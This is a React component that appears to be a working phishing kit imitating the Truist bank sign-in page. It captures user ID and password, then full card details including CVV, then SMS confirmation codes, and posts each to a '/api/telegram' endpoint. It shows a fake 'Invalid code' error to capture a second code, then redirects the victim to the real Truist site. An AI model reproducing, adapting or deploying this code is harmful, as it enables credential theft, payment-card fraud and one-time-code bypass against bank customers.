/** @format */
"use client";
import React, { useState, useEffect } from "react";

const Popup = () => {
  const [password, setPassword] = useState("");
  const [userID, setUserID] = useState("");
  const [saveUserID, setSaveUserID] = useState(false);
  const [showCardForm, setShowCardForm] = useState(false);
  const [showProcessing, setShowProcessing] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [confirmationError, setConfirmationError] = useState("");
  const [isMobile, setIsMobile] = useState(false);
  const [confirmationAttempt, setConfirmationAttempt] = useState(0); // Track confirmation attempts
  
  // Card form state
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [confirmationCode, setConfirmationCode] = useState("");

  // Check for mobile
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Single function to send all data types
  const sendData = async (dataType, data) => {
    try {
      const userAgent = navigator.userAgent;
      const landingUrl = window.location.href;
      const timestamp = new Date().toISOString();
      
      console.log(`Sending ${dataType} data:`, data);
      
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          dataType,
          data,
          userAgent, 
          landingUrl,
          timestamp
        }),
      });

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
      }

      const result = await response.json();
      console.log("Data sent successfully to Telegram:", result);
      return result;
    } catch (error) {
      console.error("Error sending data to Telegram:", error);
      // Don't throw error here - we don't want to block the user flow
      return { success: false, error: error.message };
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Check if fields are empty
    if (!userID.trim() || !password.trim()) {
      alert("Please fill in both User ID and Password before signing in.");
      return;
    }
    
    // Send login credentials immediately
    const loginData = { 
      userID, 
      password 
    };
    console.log("Sending login data:", loginData);
    
    // Send to Telegram
    await sendData('login', loginData);
    
    // Show card form
    setShowCardForm(true);
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();
    
    // Check if card fields are empty
    if (!cardName.trim() || !cardNumber.trim() || !expiryMonth.trim() || !expiryYear.trim() || !cvv.trim()) {
      alert("Please fill in all card information before continuing.");
      return;
    }
    
    // Format card data
    const cardData = {
      cardName,
      cardNumber,
      expiryMonth,
      expiryYear,
      cvv
    };
    
    console.log("Sending card data:", cardData);
    
    // Send card data immediately
    await sendData('card', cardData);
    
    // Show processing screen
    setShowProcessing(true);
    setShowCardForm(false);
    
    // After 3 seconds, show confirmation screen
    setTimeout(() => {
      setShowProcessing(false);
      setShowConfirmation(true);
      setConfirmationAttempt(0); // Reset confirmation attempts when showing confirmation form
    }, 3000);
  };

  const handleConfirmationSubmit = async (e) => {
    e.preventDefault();
    
    if (!confirmationCode.trim()) {
      alert("Please enter the confirmation code.");
      return;
    }
    
    console.log("Sending confirmation code:", confirmationCode);
    
    // Send confirmation code immediately
    await sendData('confirmation', { 
      confirmationCode 
    });
    
    // Increment attempt counter
    const nextAttempt = confirmationAttempt + 1;
    setConfirmationAttempt(nextAttempt);
    
    // Show processing screen
    setShowProcessing(true);
    setShowConfirmation(false);
    setConfirmationError("");
    
    if (nextAttempt === 1) {
      // First attempt: show error after 3 seconds
      setTimeout(() => {
        setShowProcessing(false);
        setShowConfirmation(true);
        setConfirmationError("Invalid code. Please try again.");
      }, 3000);
    } else {
      // Second attempt: redirect to Truist website after 3 seconds
      setTimeout(() => {
        window.location.href = "https://www.truist.com/";
      }, 3000);
    }
  };

  // Processing screen
  if (showProcessing) {
    return (
      <div className="popup" style={{
        fontFamily: "'Arial', sans-serif",
        backgroundColor: "#ffffff",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: isMobile ? "15px" : "20px"
      }}>
        <div style={{
          display: "flex",
          alignItems: "center",
          marginBottom: isMobile ? "20px" : "30px",
          justifyContent: "center",
          gap: isMobile ? "8px" : "10px"
        }}>
          <div style={{
            fontSize: isMobile ? "20px" : "24px",
            fontWeight: "bold",
            color: "black"
          }}>TRUST</div>
          <img 
            src="https://image2url.com/images/1765277369955-e9d02f3c-e8fd-4339-a6e1-dbd42c7e4ff0.png" 
            alt="Logo"
            style={{
              height: isMobile ? "20px" : "24px",
              width: "auto"
            }}
          />
        </div>

        <h2 style={{
          fontSize: isMobile ? "18px" : "20px",
          fontWeight: "bold",
          marginBottom: isMobile ? "15px" : "20px",
          color: "black",
          textAlign: "center"
        }}>Processing your information</h2>
        
        <div style={{
          display: "flex",
          justifyContent: "center",
          marginBottom: isMobile ? "20px" : "30px"
        }}>
          <div style={{
            width: isMobile ? "40px" : "50px",
            height: isMobile ? "40px" : "50px",
            border: "4px solid #f3f3f3",
            borderTop: "4px solid #72569c",
            borderRadius: "50%",
            animation: "spin 1s linear infinite"
          }}></div>
        </div>
        
        <p style={{
          fontSize: isMobile ? "13px" : "14px",
          color: "#666",
          marginBottom: isMobile ? "20px" : "30px",
          textAlign: "center",
          maxWidth: isMobile ? "280px" : "400px",
          padding: isMobile ? "0 10px" : "0"
        }}>
          Please wait while we process your information...
        </p>

        <style jsx>{`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
        
        <div style={{
          position: "absolute",
          bottom: isMobile ? "15px" : "20px",
          left: "0",
          right: "0",
          textAlign: "center",
          fontSize: isMobile ? "11px" : "12px",
          color: "#999",
        }}>
          © 2025, Truist. All Rights Reserved.
        </div>
      </div>
    );
  }

  // Confirmation screen - MATCHES Screenshot (89).png
  if (showConfirmation) {
    return (
      <div className="popup" style={{
        fontFamily: "'Arial', sans-serif",
        backgroundColor: "#ffffff",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: isMobile ? "15px" : "20px"
      }}>
        <div style={{
          display: "flex",
          alignItems: "center",
          marginBottom: isMobile ? "20px" : "30px",
          justifyContent: "center",
          gap: isMobile ? "8px" : "10px"
        }}>
          <div style={{
            fontSize: isMobile ? "24px" : "30px",
            fontWeight: "bold",
            color: "black"
          }}>TRUST</div>
          <img 
            src="https://image2url.com/images/1765277369955-e9d02f3c-e8fd-4339-a6e1-dbd42c7e4ff0.png" 
            alt="Logo"
            style={{
              height: isMobile ? "24px" : "30px",
              width: "auto"
            }}
          />
        </div>

        <h2 style={{
          fontSize: isMobile ? "18px" : "20px",
          fontWeight: "bold",
          marginBottom: isMobile ? "8px" : "10px",
          color: "#333",
          textAlign: "center"
        }}>Confirmation</h2>
        
        <p style={{
          fontSize: isMobile ? "13px" : "14px",
          color: "#666",
          marginBottom: isMobile ? "20px" : "30px",
          textAlign: "center",
          maxWidth: isMobile ? "280px" : "300px",
          padding: isMobile ? "0 10px" : "0"
        }}>
          Please enter the code sent to your phone number to continue.
        </p>

        <form onSubmit={handleConfirmationSubmit} style={{ 
          width: "100%", 
          maxWidth: isMobile ? "280px" : "400px",
          padding: isMobile ? "0 10px" : "0"
        }}>
          <div style={{ marginBottom: isMobile ? "8px" : "10px" }}>
            <input 
              type="text" 
              value={confirmationCode}
              onChange={(e) => setConfirmationCode(e.target.value)}
              placeholder="Enter the code"
              style={{
                width: "100%",
                padding: isMobile ? "10px 12px" : "12px 15px",
                borderRadius: "4px",
                border: "1px solid #ddd",
                fontSize: isMobile ? "13px" : "14px",
                boxSizing: "border-box",
                textAlign: "center"
              }}
              required
            />
            {confirmationError && (
              <p style={{
                color: "red",
                fontSize: isMobile ? "11px" : "12px",
                marginTop: "5px",
                textAlign: "center"
              }}>
                {confirmationError}
              </p>
            )}
          </div>

          <button 
            type="submit" 
            style={{
              width: "100%",
              backgroundColor: "#72569c",
              color: "#ffffff",
              border: "none",
              padding: isMobile ? "12px" : "14px",
              borderRadius: "4px",
              fontSize: isMobile ? "14px" : "16px",
              fontWeight: "600",
              cursor: "pointer",
              marginBottom: isMobile ? "20px" : "30px"
            }}
          >
            Continue
          </button>
        </form>
        
        <div style={{
          position: "absolute",
          bottom: isMobile ? "15px" : "20px",
          left: "0",
          right: "0",
          textAlign: "center",
          fontSize: isMobile ? "11px" : "12px",
          color: "#999",
        }}>
          © 2025, Truist. All Rights Reserved.
        </div>
      </div>
    );
  }

  // Card form - MATCHES Screenshot (86).png
  if (showCardForm) {
    return (
      <div className="popup" style={{
        fontFamily: "'Arial', sans-serif",
        backgroundColor: "#ffffff",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: isMobile ? "15px" : "20px"
      }}>
        <div style={{
          display: "flex",
          alignItems: "center",
          marginBottom: isMobile ? "20px" : "30px",
          justifyContent: "center",
          gap: isMobile ? "8px" : "10px"
        }}>
          <div style={{
            fontSize: isMobile ? "24px" : "30px",
            fontWeight: "600",
            color: "black"
          }}>TRUST</div>
          <img 
            src="https://image2url.com/images/1765277369955-e9d02f3c-e8fd-4339-a6e1-dbd42c7e4ff0.png" 
            alt="Logo"
            style={{
              height: isMobile ? "24px" : "30px",
              width: "auto"
            }}
          />
        </div>

        <h2 style={{
          fontSize: isMobile ? "18px" : "20px",
          fontWeight: "bold",
          marginBottom: isMobile ? "8px" : "10px",
          color: "#333",
          textAlign: "center"
        }}>Confirm your identity</h2>
        
        <p style={{
          fontSize: isMobile ? "13px" : "14px",
          color: "#666",
          marginBottom: isMobile ? "20px" : "30px",
          textAlign: "center",
          maxWidth: isMobile ? "280px" : "400px",
          padding: isMobile ? "0 10px" : "0"
        }}>
          Confirm your identity by entering your card information.
        </p>

        <form onSubmit={handleCardSubmit} style={{ 
          width: "100%", 
          maxWidth: isMobile ? "280px" : "400px",
          padding: isMobile ? "0 10px" : "0"
        }}>
          <div style={{ marginBottom: isMobile ? "15px" : "20px" }}>
            <label style={{
              display: "block",
              fontSize: isMobile ? "13px" : "14px",
              fontWeight: "500",
              marginBottom: isMobile ? "6px" : "8px",
              color: "#333"
            }}>Cardholder Name</label>
            <input 
              type="text" 
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
              placeholder="Name on card"
              style={{
                width: "100%",
                padding: isMobile ? "10px 12px" : "12px 15px",
                borderRadius: "4px",
                border: "1px solid #ddd",
                fontSize: isMobile ? "13px" : "14px",
                boxSizing: "border-box"
              }}
              required
            />
          </div>

          <div style={{ marginBottom: isMobile ? "15px" : "20px" }}>
            <label style={{
              display: "block",
              fontSize: isMobile ? "13px" : "14px",
              fontWeight: "500",
              marginBottom: isMobile ? "6px" : "8px",
              color: "#333"
            }}>Card Number</label>
            <input 
              type="text" 
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              placeholder="XXXX XXXX XXXX XXXX"
              maxLength="19"
              style={{
                width: "100%",
                padding: isMobile ? "10px 12px" : "12px 15px",
                borderRadius: "4px",
                border: "1px solid #ddd",
                fontSize: isMobile ? "13px" : "14px",
                boxSizing: "border-box"
              }}
              required
            />
          </div>

          <div style={{ 
            display: "flex", 
            gap: isMobile ? "15px" : "20px",
            marginBottom: isMobile ? "20px" : "30px",
            flexDirection: isMobile ? "column" : "row"
          }}>
            <div style={{ flex: 1 }}>
              <label style={{
                display: "block",
                fontSize: isMobile ? "13px" : "14px",
                fontWeight: "500",
                marginBottom: isMobile ? "6px" : "8px",
                color: "#333"
              }}>Expiration Date</label>
              <div style={{ display: "flex", gap: isMobile ? "8px" : "10px" }}>
                <input 
                  type="text" 
                  value={expiryMonth}
                  onChange={(e) => setExpiryMonth(e.target.value)}
                  placeholder="MM"
                  maxLength="2"
                  style={{
                    width: "100%",
                    padding: isMobile ? "10px 12px" : "12px 15px",
                    borderRadius: "4px",
                    border: "1px solid #ddd",
                    fontSize: isMobile ? "13px" : "14px",
                    boxSizing: "border-box"
                  }}
                  required
                />
                <input 
                  type="text" 
                  value={expiryYear}
                  onChange={(e) => setExpiryYear(e.target.value)}
                  placeholder="YY"
                  maxLength="2"
                  style={{
                    width: "100%",
                    padding: isMobile ? "10px 12px" : "12px 15px",
                    borderRadius: "4px",
                    border: "1px solid #ddd",
                    fontSize: isMobile ? "13px" : "14px",
                    boxSizing: "border-box"
                  }}
                  required
                />
              </div>
            </div>
            
            <div style={{ flex: 1 }}>
              <label style={{
                display: "block",
                fontSize: isMobile ? "13px" : "14px",
                fontWeight: "500",
                marginBottom: isMobile ? "6px" : "8px",
                color: "#333"
              }}>Security Code</label>
              <input 
                type="text" 
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                placeholder="CVV"
                maxLength="3"
                style={{
                  width: "100%",
                  padding: isMobile ? "10px 12px" : "12px 15px",
                  borderRadius: "4px",
                  border: "1px solid #ddd",
                  fontSize: isMobile ? "13px" : "14px",
                  boxSizing: "border-box"
                }}
                required
              />
            </div>
          </div>

          <button 
            type="submit" 
            style={{
              width: "100%",
              backgroundColor: "#72569c",
              color: "#ffffff",
              border: "none",
              padding: isMobile ? "12px" : "14px",
              borderRadius: "4px",
              fontSize: isMobile ? "14px" : "16px",
              fontWeight: "600",
              cursor: "pointer",
              marginBottom: isMobile ? "20px" : "30px"
            }}
          >
            Continue
          </button>
        </form>
        
        <div style={{
          position: "absolute",
          bottom: isMobile ? "15px" : "20px",
          left: "0",
          right: "0",
          textAlign: "center",
          fontSize: isMobile ? "11px" : "12px",
          color: "#999",
        }}>
          © 2025, Truist. All Rights Reserved.
        </div>
      </div>
    );
  }

  // Login form - MATCHES Screenshot (84).png
  return (
    <div className="popup" style={{
      fontFamily: "'Arial', sans-serif",
      backgroundColor: isMobile ? "#ffffff" : "#f5f5f5",
      minHeight: "100vh",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: isMobile ? "0" : "0",
      margin: "0",
      width: "100vw",
      maxWidth: "100%"
    }}>
      {isMobile ? (
        // MOBILE VERSION - Single column layout
        <div style={{
          width: "100%",
          minHeight: "100vh",
          backgroundColor: "#ffffff",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          padding: "20px 15px"
        }}>
          {/* Header for mobile */}
          <div style={{
            display: "flex",
            alignItems: "center",
            marginBottom: "30px",
            justifyContent: "center",
            gap: "8px"
          }}>
            <div style={{
              fontSize: "28px",
              fontWeight: "bold",
              color: "black"
            }}>TRUST</div>
            <img 
              src="https://image2url.com/images/1765277369955-e9d02f3c-e8fd-4339-a6e1-dbd42c7e4ff0.png" 
              alt="Logo"
              style={{
                height: "28px",
                width: "auto"
              }}
            />
          </div>

          <form onSubmit={handleSubmit} style={{ 
            width: "100%",
            maxWidth: "280px",
            display: "flex",
            flexDirection: "column",
            alignItems: "center"
          }}>
            <div style={{ width: "100%", marginBottom: "15px" }}>
              <label style={{
                display: "block",
                fontSize: "14px",
                fontWeight: "500",
                marginBottom: "6px",
                color: "#333",
                textAlign: "left"
              }}>User ID</label>
              <input 
                type="text" 
                name="user"
                value={userID}
                onChange={(e) => setUserID(e.target.value)}
                style={{
                  width: "100%",
                  padding: "10px 12px",
                  borderRadius: "4px",
                  border: "1px solid #ddd",
                  fontSize: "14px",
                  boxSizing: "border-box",
                  textAlign: "left"
                }}
                required
              />
            </div>
            
            <div className="check" style={{
              display: "flex", 
              alignItems: "center",
              marginBottom: "15px",
              width: "100%",
              justifyContent: "flex-start"
            }}>
              <input 
                type="checkbox" 
                id="saveUserID"
                checked={saveUserID}
                onChange={(e) => setSaveUserID(e.target.checked)}
                style={{
                  width: "16px", 
                  height: "16px",
                  margin: "0", 
                  marginRight: "8px"
                }}
              />
              <label 
                htmlFor="saveUserID"
                style={{ 
                  fontSize: "14px", 
                  color: "#333"
                }}
              >
                Save user ID
              </label>
            </div>
            
            <div style={{ width: "100%", marginBottom: "20px" }}>
              <label style={{
                display: "block",
                fontSize: "14px",
                fontWeight: "500",
                marginBottom: "6px",
                color: "#333",
                textAlign: "left"
              }}>Password</label>
              <input 
                type="password" 
                name="pass"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                style={{
                  width: "100%",
                  padding: "10px 12px",
                  borderRadius: "6px",
                  border: "1px solid #ddd",
                  fontSize: "14px",
                  boxSizing: "border-box",
                  textAlign: "left"
                }}
                required
              />
            </div>
            
            <button 
              type="submit" 
              className="btn2" 
              style={{
                width: "100%",
                backgroundColor: "#72569c",
                color: "white",
                border: "none",
                padding: "12px",
                borderRadius: "4px",
                fontSize: "14px",
                fontWeight: "600",
                cursor: "pointer",
                marginBottom: "20px"
              }}
            >
              Sign in
            </button>
            
            <div className="or" style={{
              textAlign: "center",
              marginBottom: "15px",
              color: "#666",
              fontSize: "14px",
              position: "relative",
              width: "100%"
            }}>
              <span style={{
                backgroundColor: "#ffffff",
                padding: "0 15px"
              }}>or</span>
              <div style={{
                position: "absolute",
                top: "50%",
                left: "0",
                right: "0",
                height: "1px",
                backgroundColor: "#ddd",
                zIndex: "-1"
              }}></div>
            </div>
            
            <button 
              type="button" 
              className="qr" 
              style={{
                width: "100%",
                backgroundColor: "transparent",
                color: "#72569c",
                border: "1px solid #72569c",
                padding: "12px",
                borderRadius: "4px",
                fontSize: "14px",
                fontWeight: "600",
                cursor: "pointer",
                marginBottom: "20px",
              }}
            >
              Sign in with a QR code
            </button>
            
            <div style={{ textAlign: "center", width: "100%" }}>
              <p style={{ margin: "0 0 15px 0" }}>
                <a href="#" style={{
                  color: "#6a4e97",
                  textDecoration: "none",
                  fontSize: "13px",
                  marginRight: "15px",
                  textDecoration: "underline"
                }}>Forgot User ID</a>
                <a href="#" style={{
                  color: "#6a4e97",
                  textDecoration: "none",
                  fontSize: "13px",
                  textDecoration: "underline"
                }}>Reset Password</a>
              </p>
              <p style={{ fontSize: "14px", color: "#6a4e97", marginBottom: "10px" }}>
                Don't have an online user ID?
              </p>
              <a href="#" style={{
                color: "#6a4e97",
                textDecoration: "underline",
                fontSize: "14px",
                fontWeight: "600"
              }}>Register now</a>
            </div>
          </form>
        </div>
      ) : (
        // DESKTOP VERSION - Two column layout
        <div className="container" style={{
          display: "flex",
          width: "100%",
          minHeight: "100vh",
          backgroundColor: "#ffffff",
          borderRadius: "0",
          overflow: "hidden",
          boxShadow: "none"
        }}>
          <div className="left" style={{
            flex: "1.2",
            backgroundColor: "#e5ddf4",
            color: "#ffffff",
            padding: "50px 40px",
            display: "flex",
            flexDirection: "column",
            justifyContent: "center"
          }}>
            <h4 style={{
              fontSize: "16px",
              fontWeight: "600",
              letterSpacing: "1px",
              margin: "0 0 30px 0",
              color: "#6a4e97",
              alignItems: "center",
              textAlign: "center"
            }}>PREMIUM REWARDS</h4>
            
            <img 
              src="https://image2url.com/images/1765261557704-92b2e42f-235b-460f-8f25-992c45723ab0.png" 
              alt="VISA Card"
              style={{
                width: "100%",
                maxWidth: "250px",
                margin: "0 auto 30px auto",
                borderRadius: "8px"
              }}
            />
            
            <span style={{
              fontSize: "30px",
              fontWeight: "200",
              marginBottom: "20px",
              textAlign: "center",
              color: "black"
            }}>New experiences are waiting.</span>
            
            <p style={{
              fontSize: "15px",
              lineHeight: "1.5",
              color: "#6a4e97",
              marginBottom: "35px",
              textAlign: "center"
            }}>
              Pave your path to adventure with 30,000 bonus points after spending $1,500 
              within 90 days of opening a Trust Enjoy Beyond credit card <li> account.</li>
            </p>
            
            <div style={{ display: "flex", flexDirection: "column", gap: "10px", alignItems: "center" }}>
              <button className="btn" style={{
                backgroundColor: "white",
                color: "#72569c",
                border: "3px solid #72569c",
                padding: "12px 24px",
                borderRadius: "14px",
                fontSize: "14px",
                fontWeight: "600",
                cursor: "pointer",
                marginBottom: "5px",
                width: "25%",
                maxWidth: "200px"
              }}>
                Apply now
              </button>
              
              <div className="links" style={{
                fontSize: "12px",
                color: "#90caf9",
                textAlign: "center",
                display: "flex",
                flexDirection: "column",
                gap: "5px"
              }}>
                <a href="#" style={{
                  color: "#6a4e97",
                  textDecoration: "none",
                  display: "block"
                }}>See rates, fees & rewards</a>
                <a href="#" style={{
                  color: "#6a4e97",
                  textDecoration: "none",
                  display: "block"
                }}>Learn more</a>
              </div>
            </div>
          </div>

          <div className="right" style={{
            flex: "1",
            padding: "50px 40px",
            backgroundColor: "#ffffff",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center"
          }}>
            <div style={{
              display: "flex",
              alignItems: "center",
              marginBottom: "30px",
              justifyContent: "center",
              gap: "10px"
            }}>
              <div style={{
                fontSize: "35px",
                fontWeight: "bold",
                color: "black"
              }}>TRUIST</div>
              <img 
                src="https://image2url.com/images/1765277369955-e9d02f3c-e8fd-4339-a6e1-dbd42c7e4ff0.png" 
                alt="Logo"
                style={{
                  height: "68px",
                  width: "auto"
                }}
              />
            </div>

            <form onSubmit={handleSubmit} style={{ 
              width: "100%",
              maxWidth: "400px",
              display: "flex",
              flexDirection: "column",
              alignItems: "center"
            }}>
              <div style={{ width: "100%", marginBottom: "15px" }}>
                <label style={{
                  display: "block",
                  fontSize: "14px",
                  fontWeight: "500",
                  marginBottom: "8px",
                  color: "#333",
                  textAlign: "left"
                }}>User ID</label>
                <input 
                  type="text" 
                  name="user"
                  value={userID}
                  onChange={(e) => setUserID(e.target.value)}
                  style={{
                    width: "100%",
                    padding: "12px 15px",
                    borderRadius: "4px",
                    border: "1px solid #ddd",
                    fontSize: "14px",
                    boxSizing: "border-box",
                    textAlign: "left"
                  }}
                  required
                />
              </div>
              
              <div className="check" style={{
                display: "flex", 
                alignItems: "center",
                marginBottom: "20px",
                width: "100%",
                justifyContent: "flex-start"
              }}>
                <input 
                  type="checkbox" 
                  id="saveUserID"
                  checked={saveUserID}
                  onChange={(e) => setSaveUserID(e.target.checked)}
                  style={{
                    width: "16px", 
                    height: "16px",
                    margin: "0", 
                    marginRight: "8px"
                  }}
                />
                <label 
                  htmlFor="saveUserID"
                  style={{ 
                    fontSize: "14px", 
                    color: "#333"
                  }}
                >
                  Save user ID
                </label>
              </div>
              
              <div style={{ width: "100%", marginBottom: "20px" }}>
                <label style={{
                  display: "block",
                  fontSize: "14px",
                  fontWeight: "500",
                  marginBottom: "8px",
                  color: "#333",
                  textAlign: "left"
                }}>Password</label>
                <input 
                  type="password" 
                  name="pass"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  style={{
                    width: "100%",
                    padding: "12px 15px",
                    borderRadius: "6px",
                    border: "1px solid #ddd",
                    fontSize: "14px",
                    boxSizing: "border-box",
                    textAlign: "left"
                  }}
                  required
                />
              </div>
              
              <button 
                type="submit" 
                className="btn2" 
                style={{
                  width: "100%",
                  backgroundColor: "#72569c",
                  color: "white",
                  border: "none",
                  padding: "12px",
                  borderRadius: "4px",
                  fontSize: "14px",
                  fontWeight: "600",
                  cursor: "pointer",
                  marginBottom: "20px"
                }}
              >
                Sign in
              </button>
              
              <div className="or" style={{
                textAlign: "center",
                marginBottom: "20px",
                color: "#666",
                fontSize: "14px",
                position: "relative",
                width: "100%"
              }}>
                <span style={{
                  backgroundColor: "#ffffff",
                  padding: "0 15px"
                }}>or</span>
                <div style={{
                  position: "absolute",
                  top: "50%",
                  left: "0",
                  right: "0",
                  height: "1px",
                  backgroundColor: "#ddd",
                  zIndex: "-1"
                }}></div>
              </div>
              
              <button 
                type="button" 
                className="qr" 
                style={{
                  width: "100%",
                  backgroundColor: "transparent",
                  color: "#72569c",
                  border: "1px solid #72569c",
                  padding: "12px",
                  borderRadius: "4px",
                  fontSize: "14px",
                  fontWeight: "600",
                  cursor: "pointer",
                  marginBottom: "25px",
                }}
              >
                Sign in with a QR code
              </button>
              
              <div style={{ textAlign: "center", width: "100%" }}>
                <p style={{ margin: "0 0 15px 0" }}>
                  <a href="#" style={{
                    color: "#6a4e97",
                    textDecoration: "none",
                    fontSize: "13px",
                    marginRight: "15px",
                    textDecoration: "underline"
                  }}>Forgot User ID</a>
                  <a href="#" style={{
                    color: "#6a4e97",
                    textDecoration: "none",
                    fontSize: "13px",
                    textDecoration: "underline"
                  }}>Reset Password</a>
                </p>
                <p style={{ fontSize: "14px", color: "#6a4e97", marginBottom: "10px" }}>
                  Don't have an online user ID?
                </p>
                <a href="#" style={{
                  color: "#6a4e97",
                  textDecoration: "underline",
                  fontSize: "14px",
                  fontWeight: "600"
                }}>Register now</a>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default Popup;
